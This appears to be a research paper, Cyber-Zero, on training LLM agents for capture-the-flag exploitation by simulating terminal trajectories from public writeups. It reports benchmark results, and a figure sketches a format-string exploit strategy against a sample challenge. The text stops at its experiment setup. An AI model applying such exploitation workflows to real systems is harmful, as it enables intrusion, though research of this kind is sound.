# **_Cyber-Zero_** : TRAINING CYBERSECURITY AGENTS WITHOUT RUNTIME

## Table of Contents

- [Cyber-Zero : TRAINING CYBERSECURITY AGENTS WITHOUT RUNTIME](#cyber-zero-training-cybersecurity-agents-without-runtime)
  - [ABSTRACT](#abstract)
  - [1 INTRODUCTION](#1-introduction)
  - [2 CYBER-ZERO FRAMEWORK](#2-cyber-zero-framework)
    - [2.1 SOURCE DATA COLLECTION](#2-1-source-data-collection)
    - [2.2 VERIFICATION-FREE TRAJECTORY GENERATION ON THE FLY](#2-2-verification-free-trajectory-generation-on-the-fly)
    - [2.3 TRAINING DATA CONSTRUCTION](#2-3-training-data-construction)
  - [3 TRAINING LLMS AS CYBERSECURITY AGENTS WITH CYBER-ZERO](#3-training-llms-as-cybersecurity-agents-with-cyber-zero)
    - [3.1 EXPERIMENT SETUP](#3-1-experiment-setup)
  - [4 SCALING CYBERSECURITY AGENTS](#4-scaling-cybersecurity-agents)
    - [4.1 SCALING WITH INFERENCE-TIME COMPUTE](#4-1-scaling-with-inference-time-compute)
    - [4.2 SCALING WITH TASK DIVERSITY](#4-2-scaling-with-task-diversity)
    - [4.3 SCALING WITH DATA SAMPLING](#4-3-scaling-with-data-sampling)
  - [5 RELATED WORK](#5-related-work)
  - [6 CONCLUSION](#6-conclusion)
  - [IMPACT STATEMENT](#impact-statement)
  - [ACKNOWLEDGEMENT](#acknowledgement)
  - [REFERENCES](#references)
  - [A TRAINING](#a-training)
    - [A.1 EMULATED SCAFFOLDING INTERFACE](#a-1-emulated-scaffolding-interface)
    - [A.2 PROMPT FOR PLAYER MODEL](#a-2-prompt-for-player-model)
    - [A.3 PROMPT FOR SYSTEM MODEL](#a-3-prompt-for-system-model)
  - [B BENCHMARK ISSUES](#b-benchmark-issues)
    - [B.1 INTERCODE-CTF](#b-1-intercode-ctf)
    - [B.2 NYU CTF BENCH](#b-2-nyu-ctf-bench)
    - [B.3 CYBENCH](#b-3-cybench)
  - [D ANALYSIS ON MAIN RESULTS](#d-analysis-on-main-results)
  - [E ABLATION STUDIES](#e-ablation-studies)
  - [F QUALITATIVE STUDIES ON CYBER-ZERO DATA](#f-qualitative-studies-on-cyber-zero-data)
    - [F.1 TRAJECTORY ANALYSIS OF YA D L P CHALLENGE](#f-1-trajectory-analysis-of-ya-d-l-p-challenge)
    - [Player Model https://ctftime.org/writeup/30584](#player-model-https-ctftime-org-writeup-30584)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/30584](#https-ctftime-org-writeup-30584)
    - [Terminal Model](#terminal-model)
    - [Terminal Model](#terminal-model)
    - [https://ctftime.org/writeup/30584](#https-ctftime-org-writeup-30584)
    - [Player Model https://ctftime.org/writeup/30584](#player-model-https-ctftime-org-writeup-30584)
    - [Player Model https://ctftime.org/writeup/30584](#player-model-https-ctftime-org-writeup-30584)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/30584](#https-ctftime-org-writeup-30584)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [Terminal Model](#terminal-model)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/30584](#https-ctftime-org-writeup-30584)
    - [https://ctftime.org/writeup/30584](#https-ctftime-org-writeup-30584)
    - [Player Model https://ctftime.org/writeup/30584](#player-model-https-ctftime-org-writeup-30584)
    - [Terminal Model https://ctftime.org/writeup/30584](#terminal-model-https-ctftime-org-writeup-30584)
    - [Player Model https://ctftime.org/writeup/30584](#player-model-https-ctftime-org-writeup-30584)
    - [Terminal Model](#terminal-model)
    - [Terminal Model https://ctftime.org/writeup/30584](#terminal-model-https-ctftime-org-writeup-30584)
    - [https://ctftime.org/writeup/30584](#https-ctftime-org-writeup-30584)
    - [Terminal Model https://ctftime.org/writeup/30584](#terminal-model-https-ctftime-org-writeup-30584)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/30584](#https-ctftime-org-writeup-30584)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/30584](#https-ctftime-org-writeup-30584)
    - [Terminal Model](#terminal-model)
    - [https://ctftime.org/writeup/30584](#https-ctftime-org-writeup-30584)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/30584](#https-ctftime-org-writeup-30584)
    - [F.2 TRAJECTORY ANALYSIS OF A N E W HI R E CHALLENGE](#f-2-trajectory-analysis-of-a-n-e-w-hi-r-e-challenge)
    - [Terminal Model](#terminal-model)
    - [Player Model https://ctftime.org/writeup/40114](#player-model-https-ctftime-org-writeup-40114)
    - [Terminal Model](#terminal-model)
    - [https://ctftime.org/writeup/40114](#https-ctftime-org-writeup-40114)
    - [Player Model https://ctftime.org/writeup/40114](#player-model-https-ctftime-org-writeup-40114)
    - [Terminal Model](#terminal-model)
    - [Player Model https://ctftime.org/writeup/40114](#player-model-https-ctftime-org-writeup-40114)
    - [Player Model https://ctftime.org/writeup/40114](#player-model-https-ctftime-org-writeup-40114)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/40114](#https-ctftime-org-writeup-40114)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [Player Model](#player-model)
    - [Terminal Model](#terminal-model)
    - [https://ctftime.org/writeup/40114](#https-ctftime-org-writeup-40114)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [Player Model https://ctftime.org/writeup/40114](#player-model-https-ctftime-org-writeup-40114)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/25465](#https-ctftime-org-writeup-25465)
    - [Terminal Model](#terminal-model)
    - [https://ctftime.org/writeup/25465](#https-ctftime-org-writeup-25465)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/25465](#https-ctftime-org-writeup-25465)
    - [Terminal Model](#terminal-model)
    - [Player Model https://ctftime.org/writeup/25465](#player-model-https-ctftime-org-writeup-25465)
    - [Terminal Model https://ctftime.org/writeup/25465](#terminal-model-https-ctftime-org-writeup-25465)
    - [Player Model https://ctftime.org/writeup/25465](#player-model-https-ctftime-org-writeup-25465)
    - [Terminal Model](#terminal-model)
    - [https://ctftime.org/writeup/25465](#https-ctftime-org-writeup-25465)
    - [Player Model https://ctftime.org/writeup/25465](#player-model-https-ctftime-org-writeup-25465)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/25465](#https-ctftime-org-writeup-25465)
    - [Terminal Model](#terminal-model)
    - [https://ctftime.org/writeup/25465](#https-ctftime-org-writeup-25465)
    - [Terminal Model](#terminal-model)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [Player Model https://ctftime.org/writeup/25465](#player-model-https-ctftime-org-writeup-25465)
    - [Player Model](#player-model)
    - [Terminal Model](#terminal-model)
    - [Terminal Model](#terminal-model)
    - [https://ctftime.org/writeup/25465](#https-ctftime-org-writeup-25465)
    - [Player Model](#player-model)
    - [Player Model https://ctftime.org/writeup/25465](#player-model-https-ctftime-org-writeup-25465)
    - [Terminal Model](#terminal-model)
    - [Player Model https://ctftime.org/writeup/25465](#player-model-https-ctftime-org-writeup-25465)
    - [Terminal Model https://ctftime.org/writeup/25465](#terminal-model-https-ctftime-org-writeup-25465)
    - [Player Model https://ctftime.org/writeup/25465](#player-model-https-ctftime-org-writeup-25465)
    - [F.4 TRAJECTORY ANALYSIS OF SN A K E LI C E N S E CHALLENGE](#f-4-trajectory-analysis-of-sn-a-k-e-li-c-e-n-s-e-challenge)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/11841](#https-ctftime-org-writeup-11841)
    - [Terminal Model https://ctftime.org/writeup/11841](#terminal-model-https-ctftime-org-writeup-11841)
    - [Player Model https://ctftime.org/writeup/11841](#player-model-https-ctftime-org-writeup-11841)
    - [Terminal Model https://ctftime.org/writeup/11841](#terminal-model-https-ctftime-org-writeup-11841)
    - [Player Model https://ctftime.org/writeup/11841](#player-model-https-ctftime-org-writeup-11841)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [F.5 TRAJECTORY ANALYSIS OF WA S M B A B Y CHALLENGE](#f-5-trajectory-analysis-of-wa-s-m-b-a-b-y-challenge)
    - [Player Model](#player-model)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/29616](#https-ctftime-org-writeup-29616)
    - [Terminal Model](#terminal-model)
    - [https://ctftime.org/writeup/29616](#https-ctftime-org-writeup-29616)
    - [Player Model https://ctftime.org/writeup/29616](#player-model-https-ctftime-org-writeup-29616)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [Terminal Model](#terminal-model)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/29616](#https-ctftime-org-writeup-29616)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/29616](#https-ctftime-org-writeup-29616)
    - [Terminal Model](#terminal-model)
    - [https://ctftime.org/writeup/29616](#https-ctftime-org-writeup-29616)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/29616](#https-ctftime-org-writeup-29616)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/29616](#https-ctftime-org-writeup-29616)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/29616](#https-ctftime-org-writeup-29616)
    - [Terminal Model](#terminal-model)
    - [Player Model](#player-model)
    - [https://ctftime.org/writeup/29616](#https-ctftime-org-writeup-29616)
    - [Terminal Model](#terminal-model)

---

**Terry Yue Zhuo**<sup>1</sup><sup>_,_2</sup><sup>_∗_</sup> **Dingmin Wang**<sup>2</sup> **Hantian Ding**<sup>2</sup> **Varun Kumar**<sup>2</sup> **Zijian Wang**<sup>2</sup>


*(University Shield Logo)*


*(AWS Logo)*


_Monash University_ 2 _AWS AI Labs_

_terry.zhuo@monash.edu {wdimmy, dhantian, kuvrun, zijwan}@amazon.com_

### ABSTRACT

> Large Language Models (LLMs) have achieved remarkable success in software engineering tasks when trained with executable runtime environments, particularly in resolving GitHub issues. However, such runtime environments are often unavailable in other domains, especially cybersecurity, where challenge configurations and execution contexts are ephemeral or restricted. We present CYBER-ZERO, the first runtime-free framework for synthesizing high-quality agent trajectories to train cybersecurity LLMs. CYBER-ZERO leverages publicly available CTF writeups and employs persona-driven LLM simulation to reverse-engineer runtime behaviors and generate realistic, long-horizon interaction sequences without actual environments. Using trajectories synthesized by CYBER-ZERO, we train LLMbased agents that achieve up to 13.1% absolute performance gains over baseline models on three prominent CTF benchmarks: InterCode-CTF, NYU CTF Bench, and Cybench. Our best model, CYBER-ZERO-32B, establishes new state-of-the-art performance among open-weight models, matching the capabilities of proprietary systems like DeepSeek-V3-0324 and Claude-3.5-Sonnet while offering superior cost-effectiveness, and demonstrating that runtime-free trajectory synthesis can effectively democratize the development of state-of-the-art cybersecurity agents.

> https://github.com/amazon-science/cyber-zero


```mermaid
xychart-beta
    title "InterCode-CTF, NYU CTF, Cybench Pass@1 (%)"
    x-axis ["Claude-3.7", "Claude-3.5", "DeepSeek-V3", "Gemini-2.5", "Qwen3-32B", "Qwen3-14B", "Qwen3-8B"]
    y-axis "Pass@1 (%)" 0 --> 90
    bar [88, 87, 82, 81, 65, 60, 46]
```


> <!-- Start of picture text -->
> InterCode-CTF 20.0 NYU CTF 35 Cybench<br>Cyber-Zero<br>80 17.5 30 Baseline<br>15.0<br>25<br>60<br>12.5<br>20<br>10.0<br>40 15<br>7.5<br>10<br>20 5.0<br>2.5 5<br>0 0.0 0<br>Claude-3.7-SonnetClaude-3.5-SonnetDeepSeek-V3-0324Gemini-2.5-FlashQwen3-32BQwen3-14BQwen3-8BClaude-3.7-SonnetClaude-3.5-SonnetGemini-2.5-FlashDeepSeek-V3-0324Qwen3-32BQwen3-14BQwen3-8BClaude-3.7-SonnetDeepSeek-V3-0324Claude-3.5-SonnetGemini-2.5-FlashQwen3-14BQwen3-32BQwen3-8B<br>Pass@1 (%)<br><!-- End of picture text -->

> Figure 1: CYBER-ZERO enables open LLMs like Qwen3 to achieve the superior performance comparable with state-of-the-art models. We note that the evaluation is conducted under greedy decoding and ENIGMA+ scaffold, following Abramovich et al. (2025).

> _∗_ Work done during an internship at Amazon.

> 1

### 1 INTRODUCTION

Modern cybersecurity demands continuous security analysis of increasingly complex software systems. As the attack surface of globally connected systems expands, traditional manual security analysis techniques struggle to keep pace with the need for rapid vulnerability detection and patching. This challenge has catalyzed significant research initiatives, including the DARPA Cyber Grand Challenge (Song & Alves-Foss, 2015) and DARPA AIxCC (DARPA, 2024), which aim to develop autonomous exploitation frameworks. Within this landscape, Capture The Flag (CTF) competitions have emerged as the de facto standard for assessing machine learning models’ cybersecurity reasoning capabilities. These competitions require sophisticated multi-step adversarial thinking to exploit vulnerabilities and extract hidden flags from simulated systems (Anthropic, 2025a; xAI, 2025; OWASP GenAI Project (CTI Layer Team), 2025).

Recent advances have demonstrated promising results in applying large language model (LLM) agents to CTF challenges (Hurst et al., 2024; Jaech et al., 2024; Anthropic, 2025b; Abramovich et al., 2025), with systems like ENIGMA (Abramovich et al., 2025) showing substantial progress on complex security tasks. However, these approaches achieve strong performance only when paired with frontier proprietary models such as OpenAI’s o3 or Anthropic’s Claude-3.5-Sonnet. They fail to generalize to open-source LLMs, creating a significant capability gap between proprietary and open models.

This performance disparity stems from two fundamental challenges. First, most open models lack the sophisticated agentic capabilities essential for complex cybersecurity tasks, including self-directed reasoning, long-horizon planning, and strategic tool utilization (Shao et al., 2024; Zhang et al., 2025). Second, and more critically, the scarcity of high-quality training data fundamentally limits the development of capable open-source cybersecurity agents. Unlike software engineering domains where comprehensive codebases and issue resolution contexts are readily available (Pan et al., 2024; Xie et al., 2025; Wei et al., 2025b), CTF challenges present unique data acquisition issues. Most competitions provide only ephemeral access to vulnerable environments, with minimal postcompetition maintenance or documentation. Even when challenges become open-source through community efforts, the absence of executable environments prevents the collection of authentic agent trajectories that capture the iterative, exploratory nature of vulnerability discovery and exploitation.

To address these limitations, we present CYBER-ZERO, the first framework that synthesizes highquality trajectories for cybersecurity agents without requiring access to original executable environments. Specifically, CYBER-ZERO utilizes the public CTF writeups, containing step-by-step problem-solving strategies documented by participants, to reconstruct the simulated environment and generate complete learning trajectories. CYBER-ZERO operates through a multi-stage pipeline that combines persona-driven LLM agents with strategic environment simulation. We construct specialized LLM personas (Ge et al., 2024) to analyze existing writeups and reverse-engineer plausible environment behaviors. These personas collaborate to synthesize complete, long-horizon interaction sequences that explore not only successful solution paths but also realistic failed attempts, debugging sessions, and strategic pivots that characterize authentic cybersecurity workflows.

We extensively evaluate CYBER-ZERO by training LLM agents on our synthesized trajectories and testing them on three popular CTF benchmarks (Figure 1) comprising over 300 challenges. Our approach achieves up to 13.1% absolute performance gains compared to baseline methods, with our best CYBER-ZERO-32B model matching the performance of state-of-the-art LLMs like Claude3.5-Sonnet<sup>1</sup> and DeepSeek-V3-0324. Notably, our models demonstrate strong generalization across diverse CTF challenges, indicating that our trajectory synthesis captures fundamental cybersecurity reasoning patterns rather than memorizing specific solutions.

Our contributions are as follows:

- We introduce the first runtime-free framework for synthesizing agent trajectories when executable environments are unavailable, featuring persona-driven LLMs that reverse-engineer system behaviors and generate realistic interaction sequences.

- We construct a large-scale collection of synthesized cybersecurity trajectories covering diverse CTF categories, enabling effective training of LLM agents for vulnerability discovery and exploitation.

> 1By default we refer to the v2 variant of Sonnet 3.5.


Table 1: CYBER-ZERO is the first without _any_ runtime environment. _Detection:_ whether the task requires vulnerability detection; _Exploitation:_ whether the task needs LLMs to exploit the detected vulnerabilities; _Agentic:_ whether each instance is repaired with an interactive environment for exploration; _Real Task:_ whether each instance is developed by human experts.

|**Dataset**|**Detection**|**Exploitation**|**Agentic**|**Real Task**|**# Total**|**# Train**|
|---|---|---|---|---|---|---|
|SecLLMHolmes (Ullah et al.,2024)|✓|✗|✗|✓|208|0|
|PrimeVul (Ding et al.,2024)|✓|✗|✗|✓|6,968|5,574|
|SecRepoBench (Dilgren et al.,2025)|✗|✗|✓|✓|318|0|
|CVE-Bench (Wang et al.,2025)|✗|✗|✓|✓|509|0|
|CyberSecEval 3 (Wan et al.,2024)|✓|✓|✓|✗|6|0|
|SecCodePLT (Yang et al.,2024b)|✓|✓|✓|✗|1,345|0|
|InterCode-CTF (Yang et al.,2023)|✓|✓|✓|✓|100|0|
|NYU CTF Bench (Shao et al.,2024)|✓|✓|✓|✓|200|0|
|Cybench (Zhang et al.,2025)|✓|✓|✓|✓|40|0|
|CYBER-ZERO(Ours)|✓|✓|✓|✓|6,188|6,188|


- We conduct a thorough analysis across multiple CTF benchmarks demonstrating that models trained on synthesized trajectories achieve state-of-the-art performance, closing the gap between open and proprietary models.

- We develop ENIGMA+, an agent scaffold with significantly improved utility that reduces evaluation time from days to hours while maintaining evaluation fidelity.

- We manually identify and patch problematic challenges affecting 6% of existing CTF benchmarks. We will release corrected versions to facilitate fair and accurate evaluation of cybersecurity agents.

### 2 CYBER-ZERO FRAMEWORK

CYBER-ZERO is the first runtime-free framework designed to synthesize high-quality agent trajectories for training LLMs on offensive cybersecurity tasks. As shown in Table 1, existing cybersecurity datasets either lack agentic interaction patterns or fail to provide training data, creating a critical gap in the development of capable security agents. Inspired by the success of trajectory-based learning in software engineering agents (Jimenez et al., 2024; Yang et al., 2024a), CYBER-ZERO adapts this paradigm to cybersecurity by transforming natural-language CTF writeups into structured, simulated interaction sequences (Figure 2). Different from prior pipelines for SWE tasks (Pan et al., 2024; Xie et al., 2025; Yang et al., 2025b), our method enables learning from rich problem-solving workflows without requiring access to original challenges’ environments. The framework operates through three main stages: source data collection, persona-driven interaction trajectory generation, and dataset construction with examples illustrated in Appendix F.

#### 2.1 SOURCE DATA COLLECTION

CYBER-ZERO begins by curating a large corpus of publicly available CTF writeups, which are detailed solutions by competition participants. These writeups contain rich procedural narratives, including reconnaissance steps, attempted commands, debugging strategies, and final exploits. Despite their unstructured format, they provide a valuable proxy for agent trajectories when properly processed.

We collect thousands of writeups from CTFtime, leveraging the CTF Archives repository. Each writeup includes metadata such as challenge name, competition event, and point value. However, the raw data presents several challenges that require systematic processing: First, the writeup is originally stored as the web format, which contains noisy HTML and XML tags. We use markdownify to convert these into clean Markdown format. Second, we notice that a large number of writeups on CTFtime do not contain enough information, and often contains only pointers to external websites or deprecated repositories. To ensure quality, we remove all URLs and exclude ones shorter than 1,000 characters. Third, certain critical information such as task descriptions and available files is often missing. We address this by using DeepSeek-V3-0324 to generate missing metadata and extract flag values from writeup content, retaining only those with verifiable flags to ensure logical coherence.


```mermaid
flowchart TD
    %% CTFTime Writeup Text Box
    Writeup["<b>CTF TIME Writeups</b><br/><hr/><br/><b>Vulnerability Analysis</b><br/>After a lot of reverse engineering using Ghidra, the binary<br/>was renamed for clarity. Key components of the program: ...<br/><b>Format String Vulnerability</b><br/>A format string bug was found in the greet function, which is<br/>called via print_actions.<br/>...<br/><b>Strategy</b><br/>Leak base address using format string. Calculate the actual<br/>Payload Use printf format strings to ...<br/><br/><b>Flag: CTF { xxx }</b>"]

    style Writeup fill:#f9f9f9,stroke:#d9534f,stroke-width:3px,text-align:left,border-radius:10px
```


<!-- Start of picture text -->
Writeups<br>Vulnerability Analysis<br> After a lot of reverse engineering using Ghidra, the binary<br>was renamed for clarity. Key components of the program: …<br>Format String Vulnerability<br>A format string bug was found in the greet function, which is<br>called via print_actions.<br>… Strategy<br>Leak base address using format string. Calculate the actual<br>Payload Use printf format strings to …<br>Flag: CTF{xxx}<br><!-- End of picture text -->


```mermaid
flowchart TD
    Icon["Hacker Icon (Red Hat & Mask)"]
    style Icon fill:#ff4d4d,stroke:#fff,stroke-width:2px,color:white,font-weight:bold,border-radius:50%
```


```mermaid
flowchart TD
    %% Action snippet
    Action["List all files in<br/>the current<br/>directory to<br/>verify the<br/>challenge binary<br/>is present.<br/><br/><b>ls -la</b> 🔍"]

    style Action fill:#f1f1f1,stroke:#333,stroke-width:1px,text-align:left
```


<!-- Start of picture text -->
List all files in<br>the current<br>directory to<br>verify the<br>challenge binary<br>is present.<br>ls -la<br><!-- End of picture text -->


```mermaid
flowchart TD
    Icon["Hacker Icon (Red Hat & Mask)"]
    style Icon fill:#ff4d4d,stroke:#fff,stroke-width:2px,color:white,font-weight:bold,border-radius:50%
```


```mermaid
flowchart TD
    %% Hint Snippet
    Hint["<span style='color:green;'>Error: Function 'main' not found<br/>in random_vault</span><br/>...<br/><span style='color:red;'>--HINT_START--<br/>[HINT]<br/>The binary doesn't have a main function.<br/>Try using...<br/>[/HINT]<br/>--HINT_END--</span> 💡"]

    style Hint fill:#f1f1f1,stroke:#333,stroke-width:1px,text-align:left
```


<!-- Start of picture text -->
Error: Function 'main' not found<br>in random_vault<br>... ---HINT_START---<br>[HINT]<br>The binary doesn't have a main function.<br>Try using...<br>[/HINT]<br>---HINT_END---<br><!-- End of picture text -->


> **CTF Challenge**
>
> **Name:** Random Vault
> **Category:** Pwn
> **Files:** `["random_vault"]`
> **Server:** The challenge server is running on `200.136.252.34`
>
> *A legacy service that was once used to store HARPA's secrets has been discovered. The service was accidentally left accessible on the internet until December 2019. Your goal is to exploit the service's vulnerabilities to extract the secrets still stored on the server.*


<!-- Start of picture text -->
CTF Challenge<br>Name:  Random Vault<br>Category:  Pwn<br>Files:  ["random_vault"]<br>Server:  The challenge server is running<br>on 200.136.252.34<br>A legacy service that was once used to store HARPA's<br>secrets has been discovered. The service was accidentally<br>left accessible on the internet until December 2019. Your<br>goal is to exploit the service's vulnerabilities to extract the<br>secrets still stored on the server.<br><!-- End of picture text -->


**Player Model** 🕵️‍♂️


<!-- Start of picture text -->
Player Model<br><!-- End of picture text -->


**🤖 (AI Agent)**


**Terminal Model** 💻


<!-- Start of picture text -->
Terminal Model<br><!-- End of picture text -->


```mermaid
flowchart TD
    Icon["Terminal Icon >_"]
    style Icon fill:#000,stroke:#fff,stroke-width:2px,color:white,font-weight:bold,border-radius:5px
```


```mermaid
flowchart TD
    Icon["Hacker Icon (Red Hat & Mask)"]
    style Icon fill:#ff4d4d,stroke:#fff,stroke-width:2px,color:white,font-weight:bold,border-radius:50%
```


```mermaid
flowchart TD
    Icon["Terminal Icon >_"]
    style Icon fill:#000,stroke:#fff,stroke-width:2px,color:white,font-weight:bold,border-radius:5px
```


```mermaid
flowchart TD
    %% Action snippet
    Action["The edited script looks<br/>good! Let's run it as<br/>follows:<br/><br/><b>python3 exploit.py</b> 🧪"]

    style Action fill:#f1f1f1,stroke:#333,stroke-width:1px,text-align:left
```


<!-- Start of picture text -->
The edited script looks<br>good! Let’s run it as<br>follows:<br>python3 exploit.py<br><!-- End of picture text -->


```mermaid
flowchart TD
    Icon["Terminal Icon >_"]
    style Icon fill:#000,stroke:#fff,stroke-width:2px,color:white,font-weight:bold,border-radius:5px
```


```mermaid
flowchart TD
    Icon["Hacker Icon (Red Hat & Mask)"]
    style Icon fill:#ff4d4d,stroke:#fff,stroke-width:2px,color:white,font-weight:bold,border-radius:50%
```


```mermaid
flowchart TD
    %% Action snippet
    Action["Fantastic! We've<br/>successfully captured the<br/>Random Vault service and<br/>captured the flag.<br/><br/><b>submit CTF{xxx}</b> 🎉"]

    style Action fill:#f1f1f1,stroke:#333,stroke-width:1px,text-align:left
```


<!-- Start of picture text -->
Fantastic! We've<br>successfully captured the<br>Random Vault service and<br>captured the flag.<br>submit CTF{xxx}<br><!-- End of picture text -->

Figure 2: CYBER-ZERO synthesizes CTF challenges from collected writeups then uses the challenge descriptions and writeup content to create the persona-driven models ( _Player Model_ and _Bash Model_ ), and collects trajectories through simulated agent-environment interplay.

After this multi-stage processing pipeline and excluding writeups from competitions covered by our evaluation benchmarks, we successfully construct a dataset of 6,188 high-quality CTF writeups. These span 4,610 unique challenges from 543 CTF competitions across 6 task categories (detailed in Table 2), covering competitions from 2017 to 2025.

#### 2.2 VERIFICATION-FREE TRAJECTORY GENERATION ON THE FLY

Building upon the CTF writeups and synthetic metadata, we aim to construct multi-turn trajectories that mimic realistic agent workflows for solving various CTF challenges. However, producing high-quality interaction data remains challenging. First, trajectories generated in a single pass are often overly linear and omit the trial-and-error, exploration, and self-repair behaviors commonly seen in human workflows (see Appendix E). Second, there is no runtime environment to verify each step, introducing risks of hallucinated behavior and unrealistic command outputs.

To address these challenges, we propose a _persona-driven dual-LLM approach_ for trajectory generation without execution environments, as illustrated in Figure 2. Our method simulates a complete CTF-solving ecosystem using two specialized LLMs: one acts as a Bash terminal emulating system responses, while the other embodies a CTF player issuing commands and reasoning about the task.

**Persona 1: CTF Player** We configure the first model to embody an experienced security engineer with expertise across common challenge categories. The prompt defines a consistent agent persona, scaffold-compatible output format, and a set of behavioral guidelines. The model is instructed to reason step-by-step in plain text before issuing actions and to avoid interactive or ambiguous behaviors incompatible with scripted agent scaffolds. The player model is given only the challenge content like in a real competition, such as task description, available files, and environmental assumptions, but not the original writeup or the correct flag. This encourages the agent to solve the challenge from first principles and avoids contamination from ground truth trajectories.

**Persona 2: Bash Terminal** The second model simulates a terminal environment, producing system responses to player commands while preserving realistic formatting and output structure. Unlike the player model, the terminal model has access to the original writeup and reference flag, enabling it to act as a weak oracle during the trajectory generation process. To improve interaction quality, we implement a selective intervention mechanism. When the player makes repeated mistakes or


Table 2: Challenge distribution across CTF benchmarks and categories. After repairing several configurations inside the challenges, there are 17 tasks which cannot be set up as documented in Appendix B. **Crypto** : Cryptography; **Pwn** : Binary Exploitation; **Rev** : Reverse-Engineering; **Misc** : Miscellaneous.

|**Benchmark**|**Level**|**# Crypto**|**# Forensics**|**# Pwn**|**# Rev**|**# Web**|**# Misc**|**# Total**|
|---|---|---|---|---|---|---|---|---|
|InterCode-CTF|High School|16|13|2|27|2|31|91|
|NYU CTF Bench|University|53|15|38|51|19|24|192|
|Cybench|Professional|16|4|2|6|8|4|40|
|**Total**|–|88|34|44|84|29|61|323|


takes an unproductive direction, the terminal model can inject minimal hints, marked with the special [HINT]...[/HINT] tags. These brief, contextual suggestions reorient the player without revealing complete solutions, for example, encouraging further inspection of a file or reconsideration of a previous step. Empirically, we find this hint mechanism crucial for data collection, as the player model struggles to capture flags without any guidance, significantly reducing the volume of successful trajectories we can collect. Critically, the terminal model maintains strong realism constraints to simulate the command execution. With the prompt engineering, we ensure that it emulates plausible system behavior, including error messages, output fidelity, and consistent state transitions, while avoiding overt assistance or correction that would compromise trajectory authenticity.

#### 2.3 TRAINING DATA CONSTRUCTION

We scale our dual-LLM trajectory generation framework to produce a large corpus of high-quality, multi-turn interaction traces. This process supports the development of CTF-solving agents that require diverse, realistic demonstrations of iterative security problem-solving behavior.

**Emulated Scaffolding** We use the ENIGMA (Abramovich et al., 2025) architecture as the target agent scaffold for structuring our generated trajectories. ENIGMA provides a state-of-the-art framework for cybersecurity tasks, featuring modular components that define agent reasoning, action execution, and environment feedback. Its model-friendly interface displays execution results in a structured, interpretable format. To ensure compatibility, we design our dual-model generation pipeline to align with the input-output format enforced by the ENIGMA scaffold. This emulation enables direct use of the generated data with ENIGMA-based agents for training and evaluation, without requiring post-hoc adaptation.

**Policy Improvement Algorithm** Inspired by Pan et al. (2024), we design the multi-layer validation to ensure data quality and consistency for rejection sampling fine-tuning. First, each trajectory must successfully recover the correct flag, verified through exact-match detection. Second, we enforce format checks to verify Markdown consistency, structural alignment with the agent scaffold, and presence of a single command per player response. Third, terminal outputs must follow required formatting conventions, including accurate metadata headers and realistic system behavior. Finally, we use an LLM-based binary filter to evaluate the alignment between the original CTF writeup and generated trajectory.

**Generation Configuration** We adopt DeepSeek-V3-0324 for both the player and terminal roles, selected for its strong multi-turn reasoning and code generation capabilities. Each model is configured with temperature of 0.6 and top-p of 0.95 to balance output diversity and stability. To avoid overlong agent trajectories, we limit the maximum agent-environment paired turn as 40. For each CTF writeup, we generate three trajectories to increase the sampling diversity.

### 3 TRAINING LLMS AS CYBERSECURITY AGENTS WITH CYBER-ZERO

With CYBER-ZERO, we train our cybersecurity agents with various base models. Our primary objective is to establish strong baselines and demonstrate the effectiveness of our runtime-free training approach. We use Pass@ _k_ (Chen et al., 2021) as our main evaluation metric.


#### 3.1 EXPERIMENT SETUP

**Evaluation Scaffolding** We develop ENIGMA+, an enhanced version of the ENIGMA scaffold, with several key improvements for large-scale evaluation. First, ENIGMA+ executes all evaluation tasks in parallel rather than sequentially, dramatically improving efficiency. While ENIGMA requires 1-3 days to evaluate 300+ CTF challenges, ENIGMA+ completes the same evaluation in under 5 hours. This speedup is achieved by assigning each Docker container a dedicated network interface and isolated environment, enabling concurrent task execution without interference. Second, ENIGMA+ provides fairer model comparison by capping generation with a maximum number of interaction turns (40) rather than ENIGMA’s cost-based budget ($3 per instance). This approach aligns with established practices in SWE agent evaluation (Yang et al., 2024a) and ensures consistent evaluation conditions across models with different pricing structures. Third, we use _Simple Summarizer_ instead of _LLM Summarizer_ from ENIGMA, as we observe that binary decompilation output can be extremely long to exceed the context window of some LLMs.

**Test Benchmarks** We evaluate agents on three established CTF benchmarks detailed in Table 2: InterCode-CTF benchmark contains 100 CTF challenges collected from picoCTF, an online educational platform for high-school rated CTF challenges. NYU CTF Benchmark contains 200 CTF challenges from the CSAW CTF competitions (2017-2023), representing university-level difficulty. Cybench benchmark contains 40 CTF challenges collected from four distinct professional competitions: HackTheBox, Sekai CTF, Glacier and HKCert (2022-2024). These benchmarks collectively span six challenge categories: Cryptography, Forensics, Binary Exploitation, Reverse-Engineering, Web Exploitation, and Miscellaneous. For evaluation, we deploy each LLM inside the agent scaffold and provide with the access to the Linux Bash terminal.

